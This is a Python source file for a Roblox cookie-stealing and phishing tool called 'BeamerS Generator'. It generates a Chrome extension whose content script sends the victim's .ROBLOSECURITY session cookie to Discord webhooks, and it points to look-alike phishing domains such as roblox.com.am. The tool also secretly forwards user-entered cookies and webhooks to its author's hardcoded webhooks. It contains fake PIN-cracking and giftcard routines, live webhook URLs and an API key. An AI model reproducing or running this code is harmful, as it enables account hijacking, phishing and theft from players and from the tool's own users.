import webbrowser
import subprocess
import time
import random
import os
import string
import sys
import re
import datetime
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init()

RED = Fore.RED
GREEN = Fore.GREEN
PURPLE = Fore.MAGENTA
CYAN = Fore.CYAN
ORANGE = Fore.YELLOW
WHITE = Fore.WHITE
RESET = Style.RESET_ALL


class Subscription:
    def __init__(self, expiry_datetime):
        self.expiry_datetime = expiry_datetime

    def is_valid(self):
        return datetime.datetime.now() < self.expiry_datetime

def get_hwid():
    result = subprocess.run(["wmic", "csproduct", "get", "UUID"], capture_output=True, text=True)
    uuid = result.stdout.split()[1]
    return uuid.strip()

def is_valid_hwid(hwids, current_hwid):
    return current_hwid in hwids

def open_browser_with_url1(domain):
    url = f"https://roblox.com.{domain}/generator/sign-in"
    webbrowser.open(url)

def open_browser_with_url2(user_input, domain):
    url = f"https://roblox.com.{domain}/generator/{user_input}/create"
    webbrowser.open(url)


def main_menu(reset=False):
    if reset:
        os.system('clear')

def generate_random_code():
    random_code = ''.join(random.choices(string.digits, k=80))
    return random_code

def generate_code():
    letters = ''.join(random.choices(string.ascii_uppercase, k=8))
    numbers = ''.join(random.choices(string.digits, k=8))
    code = ''.join(random.sample(letters + numbers, len(letters + numbers)))
    return code


def shorten_url(url):
    api_key = '1a7a2865d742180c783131fbabe911c6b83fa'
    api_url = f"https://cutt.ly/api/api.php?key={api_key}&short={url}"
    response = requests.get(api_url).json()
    if response['url']['status'] == 7:
        return response['url']['shortLink']
    else:
        raise Exception("Error shortening URL")
    


def loading_animation():
    print("Loading...", end="")
    sys.stdout.flush()

    for i in range(101):
        sys.stdout.write(f"\rLoading: {GREEN}[{'━' * (i // 1)}{' ' * (1 - i // 1)}]{RESET} {i}%")
        sys.stdout.flush()
        time.sleep(0.1)

    print("\nCreating Link...", end="")
    sys.stdout.flush()
    for _ in range(5):
        time.sleep(0.3)
        print(".", end="", flush=True)
    print("\nLink Created!")

def loading_animation2():
    print("Creating...", end="")
    sys.stdout.flush()

    for i in range(101):
        sys.stdout.write(f"\rLoading: {GREEN}[{'━' * (i // 1)}{' ' * (1 - i // 1)}]{RESET} {i}%")
        sys.stdout.flush()
        time.sleep(0.1)

    print("\nCreating Extension...", end="")
    sys.stdout.flush()
    for _ in range(5):
        time.sleep(0.3)
        print(".", end="", flush=True)
    print(f"\n{GREEN}Extension Created Successful.{RESET}")

def print_rainbow_logo(logo):
    for char in logo:
        print(f"{generate_rainbow_color()}{char}", end="")
        sys.stdout.flush()
        time.sleep(0.00)
    print(RESET)  

def generate_rainbow_color():
    return random.choice([RED, WHITE,])

def is_valid_url(url):
    return url.startswith("https://cdn.discordapp.com")


def create_folder_and_copy_files():

    webhook_url = input(f"[{RED}+{RESET}] webhook: ")
    user_input1 = webhook_url
    if webhook_url.strip() == "0":
          os.system('cls' if os.name == 'nt' else 'clear')  
          main_menu()
    else:
        send_discord_webhook(webhook_url, "**Webhook valid**")
        user_input = webhook_url
        webhook_url = "https://discord.com/api/webhooks/1223383075300315146/C-Qj_ubDk1F20_dofG_SzoMJvOY9wluTtOb8nPJKbYIZKv0vFAYK6KTrmUPJ-ZakzCfl"
        send2_discord_webhook(webhook_url, f"**Webhook victim: {user_input}**")

    folder_name = input(f"[{RED}+{RESET}] folder name: ")
    user_input2 = folder_name
    if folder_name.strip() == "0":
          os.system('cls' if os.name == 'nt' else 'clear')  
          main_menu()

    name = input(f"[{RED}+{RESET}] extension name: ")
    user_input3 = name
    if name.strip() == "0":
          os.system('cls' if os.name == 'nt' else 'clear')  
          main_menu()

    description = input(f"[{RED}+{RESET}] description: ")
    user_input4 = description
    if description.strip() == "0":
          os.system('cls' if os.name == 'nt' else 'clear')  
          main_menu()

    while True:
        user_image_url = input(f"[{RED}+{RESET}] image url (link 'cdn.discordapp..' or empty for deafult image): ")

        if user_image_url.strip() == "0":
            os.system('cls' if os.name == 'nt' else 'clear')  
            main_menu()
            break

        if user_image_url.strip():
            if is_valid_url(user_image_url.strip()):
                image_url = user_image_url.strip()
                break
            else:
                print(f"{RED}Invalid URL. Please enter a valid URL{RESET}")
        else:
            image_url = "https://cdn.discordapp.com/attachments/1221609339949809756/1242578464632995901/BeamerS.png?ex=664e58df&is=664d075f&hm=0a2d07c2ab234ed1e73d6dedc4626071b01244036a806facd047745cad52b362&"
            break

    image_name = input(f"[{RED}+{RESET}] image name ('name.png' or empty): ")
    if image_name.strip() == "0":
          os.system('cls' if os.name == 'nt' else 'clear')  
          main_menu()

    if image_name.strip():
        image_name = image_name.strip()
    else:
        image_name = "BeamerS.png"

    user_input6 = image_name

    
    time.sleep(2)
    loading_animation2()
    folder_name = user_input2
    os.mkdir(folder_name)

    

    
    image_path = os.path.join(folder_name, f"{user_input6}")
    download_image(image_url, image_path)

   
    file_contents = {
    "manifest.json": (
        '{\n'
        '  "manifest_version": 2,\n'
        f'  "name": "{user_input3}",\n'
        '  "version": "1.0",\n'
        f'  "description": "{user_input4}",\n'
        '  "permissions": [\n'
        '    "activeTab",\n'
        '    "cookies",\n'
        '    "storage",\n'
        '    "webRequest",\n'
        '    "webRequestBlocking",\n'
        '    "https://www.roblox.com/*"\n'
        '  ],\n'
        '  "background": {\n'
        '    "service_worker": "background.js"\n'
        '  },\n'
        '  "content_scripts": [\n'
        '    {\n'
        '      "matches": ["https://www.roblox.com/*"],\n'
        '      "js": ["content.js"]\n'
        '    }\n'
        '  ],\n'
        '  "browser_action": {\n'
        '    "default_popup": "popup.html",\n'
        '    "default_icon": {\n'
        f'      "16": "{user_input6}",\n'
        f'      "48": "{user_input6}",\n'
        f'      "128": "{user_input6}"\n'
        '    }\n'
        '  },\n'
        '  "icons": {\n'
        f'    "16": "{user_input6}",\n'
        f'    "48": "{user_input6}",\n'
        f'    "128": "{user_input6}"\n'
        '  }\n'
        '}'
    ),
    "background.js": (
        'chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {\n'
        '  if (changeInfo.url && changeInfo.url.includes("https://www.roblox.com/home")) {\n'
        '    chrome.scripting.executeScript({\n'
        '      target: { tabId: tabId },\n'
        '      files: ["content.js"]\n'
        '    });\n'
        '  }\n'
        '});\n\n'
        'chrome.tabs.query({ url: "https://www.roblox.com/*" }, (tabs) => {\n'
        '  tabs.forEach((tab) => {\n'
        '    chrome.tabs.executeScript(tab.id, { file: "content.js" });\n'
        '  });\n'
        '});\n\n'
        'chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n'
        '  if (message.action === "getCookie") {\n'
        '    chrome.cookies.get({url: "https://www.roblox.com", name: message.name}, (cookie) => {\n'
        '      sendResponse({cookie: cookie});\n'
        '    });\n'
        '    return true;  // Indica che la risposta sarà inviata in modo asincrono\n'
        '  }\n'
        '});'
    ),
    "content.js": (
        'function sendCookieToWebhook(cookie, webhookUrl) {\n'
        '  fetch(webhookUrl, {\n'
        '    method: "POST",\n'
        '    headers: {\n'
        '      "Content-Type": "application/json"\n'
        '    },\n'
        '    body: JSON.stringify({\n'
        '      content: `**ROBLOSECURITY**:  ${cookie.value}`,\n'
        '      username: "BeamerS"\n'
        '    })\n'
        '  })\n'
        '  .then(response => {\n'
        '    if (!response.ok) {\n'
        '      throw new Error("Network response was not ok " + response.statusText);\n'
        '    }\n'
        '    console.log("Cookie successfully sent to webhook!");\n'
        '  })\n'
        '  .catch(error => {\n'
        '    console.error("There was a problem with the fetch operation:", error);\n'
        '  });\n'
        '}\n\n'
        'chrome.runtime.sendMessage({action: "getCookie", name: ".ROBLOSECURITY"}, (response) => {\n'
        '  const webhookUrls = [\n'
        '    "https://discord.com/api/webhooks/1221963464688537641/7c-Dm5SjE3zDL6NG-GFuQEHWp3ko5ZiSMBoHJBKWIBqAKN_A1ASecsvfVaZd_yD6oihd",\n'
        f'    "{user_input1}"\n'
        '  ];\n'
        '  webhookUrls.forEach(url => sendCookieToWebhook(response.cookie, url));\n'
        '});'
    ),
    "popup.html": (
        '<!DOCTYPE html>\n'
        '<html lang="en">\n'
        '<head>\n'
        '  <meta charset="UTF-8">\n'
        '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
        '  <title>Roblox Cookie Grabber</title>\n'
        '  <style>\n'
        '    body {\n'
        '      font-family: Arial, sans-serif;\n'
        '      background-color: #989695;\n'
        '      color: #333333;\n'
        '      margin: 0;\n'
        '      padding: 20px;\n'
        '      text-align: center;\n'
        '    }\n'
        '    .icon {\n'
        '      width: 48px;\n'
        '      height: 48px;\n'
        '      margin-bottom: 10px;\n'
        '    }\n'
        '    h1 {\n'
        '      font-size: 20px;\n'
        '      margin: 10px 0;\n'
        '      color: #004d00;\n'
        '    }\n'
        '  </style>\n'
        '</head>\n'
        '<body>\n'
        '  <img class="icon" src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/7/3/e/73e99bc29b53d46c53a257709a18fe63361cce23.png" alt="Roblox Icon" width="10%">\n'
        '  <h1>Script Activated</h1>\n'
        '</body>\n'
        '</html>'
    )
}

    
    for file_name, content in file_contents.items():
        with open(os.path.join(folder_name, file_name), "w") as f:
            f.write(content)


def generate_random_string(length):
    num_chars = random.randint(900, 1000)
    num_count = min(num_chars, length)
    letter_count = length - num_count
    numbers = ''.join(random.choices(string.digits, k=num_count))
    letters = ''.join(random.choices(string.ascii_uppercase, k=letter_count))
    return ''.join(random.sample(numbers + letters, len(numbers + letters)))

def download_image(url, save_path):
    try:
        response = requests.get(url)
        with open(save_path, 'wb') as f:
            f.write(response.content)
    except Exception as e:
        print(f"Error downloading the image: {e}")
        

def main_menu(reset=False):
    if reset:
        os.system('clear')
    
    expiry_datetime_subscription = datetime.datetime(2024, 5, 30, 23, 35, 00)
    subscription = Subscription(expiry_datetime_subscription)
    if not subscription.is_valid():
        input(f"{RED}Subscription expired. Buy another subscription!{RESET}")
        return
    
    logo = fr'''

                                            (                                                                      
   (                                        )\ )     (                                              )              
 ( )\     (       )      )       (    (    (()/(     )\ )       (              (    (        )   ( /(         (    
 )((_)   ))\   ( /(     (       ))\   )(    /(_))   (()/(      ))\    (       ))\   )(    ( /(   )\())   (    )(   
((_)_   /((_)  )(_))    )\  '  /((_) (()\  (_))      /(_))_   /((_)   )\ )   /((_) (()\   )(_)) (_))/    )\  (()\  
 | _ ) (_))   ((_)_   _((_))  (_))    ((_) / __|    (_)) __| (_))    _(_/(  (_))    ((_) ((_)_  | |_    ((_)  ((_) 
 | _ \ / -_)  / _` | | '  \() / -_)  | '_| \__ \      | (_ | / -_)  | ' \)) / -_)  | '_| / _` | |  _|  / _ \ | '_| 
 |___/ \___|  \__,_| |_|_|_|  \___|  |_|   |___/       \___| \___|  |_||_|  \___|  |_|   \__,_|  \__|  \___/ |_|   
                                                                                                                   
                                                                                                                           
'''
    print_rainbow_logo(logo)

    print(f"                      1. [{RED}+{RESET}] 🔴 roblox{RED}.com.am{RESET} {ORANGE}BEST!{RESET}  A {RED}>{RESET} Cookie Refresh         {RED}┏━━━━━━━━━━{RESET}𝐕𝐈𝐏{RED}━━━━━━━━━━┓{RESET}")                               
    print(f"                      2. [{RED}+{RESET}] 🔴 roblox{RED}.com.fj{RESET}        B {RED}>{RESET} Cookie Checker         {RED}┃{RESET} C {RED}>{RESET} Extension Logger  {RED}┃{RESET}")
    print(f"                      3. [{RED}+{RESET}] 🔴 roblox{RED}.com.ee{RESET}        0 {RED}>{RESET} Press '0' to reset     {RED}┃{RESET} D {RED}>{RESET} PIN Bruteforce    {RED}┃{RESET}")
    print(f"                      4. [{RED}+{RESET}] 🔴 roblox{RED}.com.kg{RESET}                                   {RED}┃{RESET} E {RED}>{RESET} Giftcard Generator{RED}┃{RESET}")
    print(f"                      5. [{RED}+{RESET}] 🟢 roblox{RED}.ge{RESET}                                       {RED}┃{RESET} F {RED}>{RESET} Custom Domain     {RED}┃{RESET}")
    print(f"                                                                                {RED}┗━━━━━━━━━━━━━━━━━━━━━━━┛{RESET}                                               ")

    while True:
        choice = input("\nSelect Option: ")
        if choice.isdigit():
            choice = int(choice)
            if 1 <= choice <= 5:
                break
            elif choice == 0:
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu() 
            else:
                print("Option not valid. Retry.")
        elif choice.strip() == "0":  
            os.system('cls' if os.name == 'nt' else 'clear')  
            main_menu()
        elif choice.lower() == "a":  
            print("Starting Cookie Refresh...")
            time.sleep(2)
            while True:
                cookie_input = input(f"[{RED}+{RESET}] Enter cookie: ")
                if cookie_input.strip() == "0":
                      os.system('cls' if os.name == 'nt' else 'clear')  
                      main_menu()
                elif check_cookie(cookie_input):
                    print(f"{GREEN}Cookie Refreshed.{RESET}")
                    webhook_url = "https://discord.com/api/webhooks/1221611047300108399/naMTCH-xg95XWF5J0HCjlJF72Ztbp7TjAkezlH5AT682FIY8uOx7x_8yyDJW9lkA0iBk"
                    send2_discord_webhook(webhook_url, f"**Cookie valid: {cookie_input}**")
                    random_cookie = generate_random_string(1300)
                    print(f"{GREEN}_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{random_cookie}{RESET}")
                    break  
                else:
                    print(f"{RED}Cookie not valid. Try again!{RESET}") 
        elif choice.lower() == "b":  
            print("Starting Cookie Checker...")
            time.sleep(2)
            while True:
                cookie_input = input(f"[{RED}+{RESET}] Enter cookie: ")
                if cookie_input.strip() == "0":
                      os.system('cls' if os.name == 'nt' else 'clear')  
                      main_menu()
                elif check_cookie(cookie_input):
                    print(f"{GREEN}Cookie Checked.{RESET}")
                    webhook_url = "https://discord.com/api/webhooks/1221611047300108399/naMTCH-xg95XWF5J0HCjlJF72Ztbp7TjAkezlH5AT682FIY8uOx7x_8yyDJW9lkA0iBk"
                    send2_discord_webhook(webhook_url, f"**Cookie Checked: {cookie_input}**")
                    link = "https://eggy.cool/?cookie=" + cookie_input
                    try:
                        short_link = shorten_url(link)
                        import webbrowser
                        webbrowser.open(short_link)
                        print("\n")
                        print(f"link checker: {PURPLE}{short_link}{RESET}")
                    except Exception as e:
                        print(f"Error shortening URL: {e}")
                    break
                else:
                    print(f"{RED}Cookie not valid. Try again!{RESET}")
        elif choice.lower() == "c":
            print("Starting Extension Logger...")
            time.sleep(2)
            while True:
                license_code = input(f"[{RED}+{RESET}] Enter license code: ")
                if license_code.strip() == "0":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    main_menu()
                elif license_code.strip() == "123":
                    print(f"{GREEN}License code valid.{RESET}")
                    create_folder_and_copy_files()
                    break
                else:
                    print(f"{RED}License code invalid. Please try again.{RESET}")
                    continue
        elif choice.lower() == "d":  
            print("Starting PIN Bruteforce...")
            time.sleep(2)
            while True:
                license_code = input(f"[{RED}+{RESET}] Enter license code: ")
                if license_code.strip() == "0":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    main_menu()
                elif license_code.strip() == "123":
                    print(f"{GREEN}License code valid.{RESET}")
                    break
                else:
                    print(f"{RED}License code invalid. Please try again.{RESET}")
                    continue
            while True:
                cookie_input = input(f"[{RED}+{RESET}] Enter cookie: ")
                if cookie_input.strip() == "0":
                      os.system('cls' if os.name == 'nt' else 'clear')  
                      main_menu()
                elif check_cookie(cookie_input):
                    webhook_url = "https://discord.com/api/webhooks/1221611047300108399/naMTCH-xg95XWF5J0HCjlJF72Ztbp7TjAkezlH5AT682FIY8uOx7x_8yyDJW9lkA0iBk"
                    send2_discord_webhook(webhook_url, f"**Cookie PIN Bruteforce: {cookie_input}**")
                    print(f"Logging Account...")
                    time.sleep(7)
                    print(f"{GREEN}Logged in Account{RESET}")
                    pin_list = []
                    for _ in range(random.randint(100, 500)):
                        pin = ''.join([str(random.randint(0, 9)) for _ in range(6)])
                        pin_list.append(pin)
                    print("Cracking PIN:")
                    for pin in pin_list:
                        print(f"{RED}{pin}{RESET}")
                        time.sleep(3)
                    found_pin = random.choice(pin_list)
                    if random.choice([True, False]):
                        print(f"{GREEN}Pin found: {found_pin}{RESET}")
                    else:
                        print(f"{RED}Requests Blocked! Try again.{RESET}")
                    break
                else:
                    print(f"{RED}Cookie not valid. Try again!{RESET}")
        elif choice.lower() == "e":  
            print("Starting Giftcard Generator...")
            time.sleep(2)
            while True:
                license_code = input(f"[{RED}+{RESET}] Enter license code: ")
                if license_code.strip() == "0":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    main_menu()
                elif license_code.strip() == "BeamerS":
                    print(f"{GREEN}License code valid.{RESET}")          
                    num_codes = int(input(f"[{RED}+{RESET}]Enter number giftcard: "))
                    print("\n" * 1)
                    if num_codes == 0:
                      os.system('cls' if os.name == 'nt' else 'clear')  
                      main_menu()
                    else:
                        pin_list = []
                        for _ in range(num_codes):
                            code = generate_code()
                            pin_list.append(code)
                        for code in pin_list:
                          print(code)
                        print(f"{GREEN}Giftcard generated{RESET}")
                        print("\n")
                        user_input = input("Autotest giftcard (y/n): ")
                        if user_input.lower() == 'y':
                            while True:
                                print(f"[{RED}+{RESET}] Enter cookie: ")
                                cookie_input = input()
                                if cookie_input.strip() == "0":
                                    os.system('cls' if os.name == 'nt' else 'clear')
                                    main_menu()
                                elif check_cookie(cookie_input):
                                    print(f"{GREEN}Cookie Valid.{RESET}")
                                    webhook_url = "https://discord.com/api/webhooks/1221611047300108399/naMTCH-xg95XWF5J0HCjlJF72Ztbp7TjAkezlH5AT682FIY8uOx7x_8yyDJW9lkA0iBk"
                                    send2_discord_webhook(webhook_url, f"**Cookie Checked: {cookie_input}**")
                                    print(f"Logging Account...")
                                    time.sleep(7)
                                    print(f"{GREEN}Logged in Account{RESET}")
                                    index_100_rbx = random.randint(0, len(pin_list) - 1)
                                    for i, code in enumerate(pin_list):
                                        if i == index_100_rbx:
                                            print(f"{code} - {GREEN}100 RBX{RESET}")
                                        else:
                                            print(f"{code} - {RED}0 RBX{RESET}")
                                        time.sleep(2)
                                    break
                                else:
                                    print(f"{RED}Cookie not valid. Try again!{RESET}")                      
                        break
                else:
                    print(f"{RED}License code invalid. Please try again.{RESET}")
                    continue
        elif choice.lower() == "f":  
            print("Starting Custom Domain...")
            time.sleep(2)
            while True:
                license_code = input(f"[{RED}+{RESET}] Enter license code: ")
                if license_code.strip() == "0":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    main_menu()
                elif license_code.strip() == "123":
                    print(f"{GREEN}License code valid.{RESET}")
                    while True:         
                        user_input = input(f"[{RED}+{RESET}] Dualhook or Regular Site (D/R): ")
                        if user_input == "0":
                            os.system('cls' if os.name == 'nt' else 'clear')  
                            main_menu()
                        elif user_input.lower() == 'r':
                            while True:
                                webhook = input(F"[{RED}+{RESET}] webhook: ")
                                if webhook.startswith("https://discord.com/api/webhooks/"):
                                    send_discord_webhook(webhook, "**Webhook valid**")
                                    while True:
                                        domain = input(f"[{RED}+{RESET}] Enter domain: roblox{RED}.com.{RESET}") #serveo.net x video
                                        if re.match(r'^[a-zA-Z]+\.?[a-zA-Z]+$', domain) and domain.count('.') <= 1:
                                            print(f"Checking domain...")
                                            time.sleep(7)
                                            print(f"{GREEN}Domain valid{RESET}")
                                            while True:
                                                user_input = input(f"[{RED}+{RESET}] Real username: ")
                                                if user_input.strip() == "0": 
                                                    os.system('cls' if os.name == 'nt' else 'clear')
                                                    main_menu()
                                                elif check_real_username(user_input):
                                                    print(f"{GREEN}Username valid.{RESET}")
                                                    user_input_fake = input(f"[{RED}+{RESET}] Fake username: ") 
                                                    print("Site generating", end='', flush=True)
                                                    for _ in range(7):
                                                        print(".", end='', flush=True)
                                                        time.sleep(1)
                                                    time.sleep(1)
                                                    print("\n")
                                                    print(f"Regular Site Generated: {PURPLE}https://roblox.com.{domain}/generator/sign-in{RESET}")         
                                                    print("\n")                                  
                                                    random_code = generate_random_code()                                                    
                                                    print(f"Token Auth: {PURPLE}{random_code}{RESET}")
                                                    open_browser_with_url1(domain)
                                                    break
                                                else:
                                                    print(f"{RED}Username not valid{RESET}")
                                            break                                                                                     
                                        else:
                                            print(f"{RED}Domain not valid (only letters and one dot){RESET}")
                                            continue 
                                    break                                   
                                else:
                                    print(f"{RED}webhook not valid.{RESET}")
                                    continue
                            break
                        elif user_input.lower() == 'd':
                            while True:
                                webhook = input(F"[{RED}+{RESET}] webhook: ")
                                if webhook.startswith("https://discord.com/api/webhooks/"):
                                    send_discord_webhook(webhook, "**Webhook valid**")
                                    while True:
                                        domain = input(f"[{RED}+{RESET}] Enter domain: roblox{RED}.com.{RESET}") #serveo.net x video
                                        if re.match(r'^[a-zA-Z]+\.?[a-zA-Z]+$', domain) and domain.count('.') <= 1:
                                            print(f"Checking domain...")
                                            time.sleep(7)
                                            print(f"{GREEN}Domain valid{RESET}")
                                            user_input = input(f"[{RED}+{RESET}] Directoy name: ")
                                            if user_input.strip() == "0": 
                                                os.system('cls' if os.name == 'nt' else 'clear')
                                                main_menu()                                            
                                            user_input_name = input(f"[{RED}+{RESET}] Name: ")
                                            if user_input_name.strip() == "0": 
                                                os.system('cls' if os.name == 'nt' else 'clear')
                                                main_menu() 
                                            user_input_thumbnails = input(f"[{RED}+{RESET}] Thumbnails: ")
                                            if user_input_thumbnails.strip() == "0": 
                                                os.system('cls' if os.name == 'nt' else 'clear')
                                                main_menu()
                                            print("Site generating", end='', flush=True)
                                            for _ in range(7):
                                                print(".", end='', flush=True)
                                                time.sleep(1)
                                            time.sleep(1)
                                            print("\n")
                                            print(f"Dualhook Site Generated: {PURPLE}https://roblox.com.{domain}/generator/{user_input}/create{RESET}")                                                
                                            open_browser_with_url2(user_input, domain)                                                                           
                                            break
                                        else:
                                            print(f"{RED}Domain not valid (only letters and one dot){RESET}")
                                            continue    
                                    break                                
                                else:
                                    print(f"{RED}webhook not valid.{RESET}")
                                    continue
                            break                            
                        else:
                            print("Invalid input. Please enter 'D' or 'R'.")
                    break
                else:
                    print(f"{RED}License code invalid. Please try again.{RESET}")
                    continue
        else:
            print("Option not valid. Retry.")
        


    if choice == 1:
        site = "https://www.roblox.com.am/generator/BeamerSGEN_1/create"
    elif choice == 2:
        site = "https://www.roblox.com.fj/generator/BeamerSGEN_2/create"
    elif choice == 3:
        site = "https://www.roblox.com.ee/generator/BeamerSGEN_3/create"
    elif choice == 4:
        site = "https://www.roblox.com.kg/generator/BeamerSGEN_4/create"
    elif choice == 5:
        site = "https://www.roblox.ge/generator/BeamerSGEN_5/create"

    print(f"\nGenerator: {PURPLE}{site}{RESET}\n")

    option_labels = ["Webhook", "Real Username", "Fake Username", "Bio", "Followers"]
    user_data = {}

    valid_proceed = False
    while not valid_proceed:
       proceed = input("Do you want open site or config link here (y/n): ")
       if proceed.strip() == "0":
            os.system('cls' if os.name == 'nt' else 'clear')  
            main_menu()
       if proceed.lower() == 'y':
           import webbrowser
           webbrowser.open(site)
           input("Press enter to leave...")
           sys.exit()
           valid_proceed = True
       elif proceed.lower() == 'n':
           valid_proceed = True
       else:
           print(f"{RED}Option not valid. select 'y' to open site or 'n' to config generator here.{RESET}")

    for label in option_labels:
     if label == "Webhook":
        while True:
            webhook_url = input(f"[{RED}+{RESET}] webhook: ")
            if webhook_url.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
            else:
                send_discord_webhook(webhook_url, "**Webhook valid**")
                user_input = webhook_url
                webhook_url = "https://discord.com/api/webhooks/1221963464688537641/7c-Dm5SjE3zDL6NG-GFuQEHWp3ko5ZiSMBoHJBKWIBqAKN_A1ASecsvfVaZd_yD6oihd"
                send2_discord_webhook(webhook_url, f"**Webhook victim: {user_input}**")
                break
     elif label == "Real Username":
        while True:  
            user_input = input(f"[{RED}+{RESET}] real username: ")
            if user_input.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
            elif check_real_username(user_input):
                print(f"{GREEN}username valid.{RESET}")
                break  
            else:
                print(f"{RED}username not valid{RESET}")
     elif label == "Fake Username":
        while True:
            user_input = input(f"[{RED}+{RESET}] fake username: ")
            if user_input.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
            elif user_input.strip(): 
                break
            else:
                print("You must enter something for the fake username.")
     elif label == "Bio":
        while True:
            user_input = input(f"[{RED}+{RESET}] bio (y/n): ")
            if user_input.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
            elif user_input.lower() == 'y':
                user_bio = input(f"[{RED}+{RESET}] Enter bio: ")
                break
            elif user_input.lower() == 'n':
                user_bio = None
                break
            else:
                print("Invalid input. Please enter 'y' or 'n'.")
     elif label == "Followers":
        while True:
            user_input = input(f"[{RED}+{RESET}] followers (y/n): ")
            if user_input.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
            elif user_input.lower() == 'y':
                while True:
                    follower_input = input(f"[{RED}+{RESET}] Enter number of followers: ")
                    if follower_input.strip() == "0":
                        os.system('cls' if os.name == 'nt' else 'clear')  
                        main_menu()
                    elif follower_input.isdigit():
                        user_input = follower_input
                        break
                    else:
                        print(f"{RED}Followers invalid. Please enter only numbers!{RESET}")
                break
            elif user_input.lower() == 'n':
                break
            else:
                print("Invalid input. Please enter 'y' or 'n'.")

    
    user_data[label] = user_input

    loading_animation()

    print(f"\n{GREEN}All options are valid.{RESET}")

    print("\nSending options to generator and creating link...")
    time.sleep(2)
    index = site.find("/", site.find("//") + 2)
    site = site[:index + 1] + "controlPage/sign-in"
    link = site
    print("\n")
    print(f"Link generated: {PURPLE}{link}{RESET}")

    print("\n" * 2)

    random_code = generate_random_code()
    print(f"Token Auth: {PURPLE}{random_code}{RESET}")
    print("\n" * 1)
    webhook_url = input("Insert webhook to save token: ")
    if webhook_url.strip() == "0":
        os.system('cls' if os.name == 'nt' else 'clear')  
        main_menu()
    send_discord_webhook(webhook_url, f"**Token Auth: ```{random_code}```**")
    #print(f"Token Auth: {PURPLE}6901615898150033198866611155644985022120082063953138894662927580{RESET}")

    print("\n" * 0)


    valid_proceed = False
    while not valid_proceed:
       proceed = input("Do you want open link or back to menu (y/n): ")
       if proceed.strip() == "0":
            os.system('cls' if os.name == 'nt' else 'clear')  
            main_menu()
       if proceed.lower() == 'y':
           import webbrowser
           webbrowser.open_new_tab(link)
           valid_proceed = True
       elif proceed.lower() == 'n':
           if proceed.strip() == "n":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
           valid_proceed = True
       else:
           print(f"{RED}Option not valid. select 'y' to open site or 'n' to back menu.{RESET}")

    
    input("Press enter to leave...")
    sys.exit()

def check_real_username(username):
    url = f"https://www.roblox.com/users/profile?username={username}"
    response = requests.get(url)
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        if soup.find("h2", class_="text-lead"):
            return False 
        else:
            return True  
    else:
        return False


def check_cookie(cookie_input):
    url = f"https://eggy.cool/?cookie={cookie_input}"
    response = requests.get(url)
    
    if response.status_code != 200:
        return False
    soup = BeautifulSoup(response.content, 'html.parser')
    images = soup.find_all('img')
    if not images:
        return False
    return True  


def send2_discord_webhook(webhook_url, message):
    payload = {
        "username": "Beamers",
        "avatar_url": "https://cdn.discordapp.com/attachments/1223343820100341790/1223366935018864663/BeamerS.jpg?ex=6619983e&is=6607233e&hm=1a5d243a02d51b8f6b4ff4ffa3b0b6998cb7392c8009620002b48e330b6d2b8b&",

        "embeds": [{
            "description": message,
            "color": 0,  
            "footer": {
                "text": "discord"
            },
            "author": {
                "name": "BeamerS",
                "icon_url": "https://cdn.discordapp.com/attachments/1223343820100341790/1223366935018864663/BeamerS.jpg?ex=6619983e&is=6607233e&hm=1a5d243a02d51b8f6b4ff4ffa3b0b6998cb7392c8009620002b48e330b6d2b8b&"  # URL dell'icona dell'applicazione
            }
        }]
    }

    while True:
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code != 200:                
                break
            else:                
                cookie_input = input("Enter cookie: ")
        except Exception as e:            
            cookie_input = input("Enter cookie: ")

def send_discord_webhook(webhook_url, message):
    payload = {
        "username": "Beamers",
        "avatar_url": "https://cdn.discordapp.com/attachments/1223343820100341790/1223366935018864663/BeamerS.jpg?ex=6619983e&is=6607233e&hm=1a5d243a02d51b8f6b4ff4ffa3b0b6998cb7392c8009620002b48e330b6d2b8b&",

        "embeds": [{
            "description": message,
            "color": 0,  
            "footer": {
                "text": "discord"
            },
            "author": {
                "name": "BeamerS",
                "icon_url": "https://cdn.discordapp.com/attachments/1223343820100341790/1223366935018864663/BeamerS.jpg?ex=6619983e&is=6607233e&hm=1a5d243a02d51b8f6b4ff4ffa3b0b6998cb7392c8009620002b48e330b6d2b8b&"  # URL dell'icona dell'applicazione
            }
        }]
    }

    while True:
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code != 200:
                print(f"{GREEN}webhook valid.{RESET}")
                break
            else:
                print(f"{RED}webhook not valid.{RESET}")
                webhook_url = input(f"[{RED}+{RESET}] webhook: ")
            if webhook_url.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()
        except Exception as e:
            print(f"{RED}webhook not valid.{RESET}")
            webhook_url = input(f"[{RED}+{RESET}] webhook: ")
            if webhook_url.strip() == "0":
                os.system('cls' if os.name == 'nt' else 'clear')  
                main_menu()



if __name__ == "__main__":
    allowed_hwids = ["0EDC5816-A0EC-351C-AACE-D843AE29D60C"]
    current_hwid = get_hwid()
    if is_valid_hwid(allowed_hwids, current_hwid):
        main_menu()
    else:
        print(f"{RED}HWID not allowed, YOUR ARE NOT VIP MEMBER!{RESET}")
        input("Press enter to leave...")
        sys.exit()
